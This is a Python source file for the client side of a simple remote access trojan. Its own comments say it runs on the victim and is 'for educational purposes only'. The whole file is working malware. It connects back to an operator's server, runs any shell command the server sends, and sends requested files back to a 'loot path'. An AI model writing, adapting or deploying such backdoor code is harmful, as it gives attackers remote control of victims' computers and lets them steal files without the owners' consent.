# client software for my very basic python RAT
# client = run on victim
# by cayden wright
# educational purposes only
# 3 January 2023

import socket
import os
import subprocess
import re
import time

HOST = "127.0.0.1"  # The server's hostname or IP address
PORT = 1234  # The port used by the server
ENCODING = 'utf-8'
TIMEOUT = 30  # time in seconds to keep trying to connect to the server

connected = False
retry_count = 0
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    while not connected:
        try:
            s.connect((HOST, PORT))
            connected = True
            break
        except ConnectionError:
            retry_count += 1
            time.sleep(1)
        if retry_count > TIMEOUT:
            exit()

    # send current working directory
    working_directory = os.getcwd()
    s.sendall(working_directory.encode(ENCODING))
    while True:
        # get command to run
        command_to_run = s.recv(1024).decode(ENCODING)
        # special commands
        if command_to_run[:9] == "rat_snake":
            # stop client
            if command_to_run[10:] == "quit":
                response = "special:client_stopped"
                s.sendall(response.encode(ENCODING))
                exit()
            # send file
            # rat_snake download
            elif command_to_run[10:18] == "download":
                filename = command_to_run[19:]
                # strip all spaces
                if os.path.exists(filename):
                    # prep server for recieving
                    file_size = os.path.getsize(filename)
                    # server needs no spaces in filename
                    server_filename = re.sub(" ", "-", filename)
                    s.sendall(f"special:recieve_file {server_filename} {file_size}".encode(ENCODING))
                    # open file and send
                    with open(filename, "rb") as file:
                        buffer = file.read(file_size)
                        s.sendall(buffer)
                    response = "file transfer complete."
                else:
                    response = "file {0} does not exist.".format(filename)
            # unknown special command or help
            else:
                response = "unknown special command.\nquit - quits rat_snake and closes client\ndownload <FILE_NAME> - downloads file to loot path"
        # cd case (change directory and send back cwd)
        elif command_to_run[:2] == 'cd':
            try:
                os.chdir(command_to_run[3:])
                response = os.getcwd()
            except FileNotFoundError as error:
                response = str(error)
        else:
            # else just run the command as normal
            response = subprocess.getoutput(command_to_run)

        # send response generated by above if/else block
        s.sendall(response.encode(ENCODING))

        # and then send current working directory
        working_directory = os.getcwd()
        s.sendall(working_directory.encode(ENCODING))
